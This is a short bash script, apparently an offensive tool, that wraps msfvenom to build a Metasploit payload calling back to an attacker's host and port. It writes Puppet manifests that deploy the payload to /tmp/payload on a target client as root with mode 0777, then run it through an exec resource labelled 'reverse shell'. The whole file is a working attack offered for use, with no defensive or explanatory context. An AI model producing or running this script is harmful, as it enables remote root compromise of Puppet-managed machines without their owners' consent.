#!/bin/bash

#   Useful Manual Commands:
#	msfvenom --list payloads
#	msfvenom --list encoders
#	msfvenom --help-formats

echo "msf-Puppet wrapper by Tanoy n0tty Bose"
echo "Usage: ./puppet_payload.sh <metasploit payload> <type of binary> <local host ip> <local host port> <output directory>"
mkdir -p ${5}/modules/my_file/files/
mkdir -p ${5}/modules/my_file/manifests/
mkdir -p ${5}/manifests/

msfvenom -p ${1} -f ${2} lhost=${3} lport=${4} > ${5}/modules/my_file/files/payload
echo -e "node 'puppetclient' {\ninclude my_file\n}" > ${5}/manifests/site.pp
echo -e "class my_file {\nfile{ '/tmp/payload':\nensure => present,\nsource => 'puppet:///modules/my_file/payload',\nowner  => root,\ngroup  => root,\nmode   => '0777',\n}\nexec {'reverse shell':\ncommand => '/tmp/payload'\n}\n}" > ${5}/modules/my_file/manifests/init.pp

echo "For cleaning up, just delete the /tmp/payload from the target puppet client"
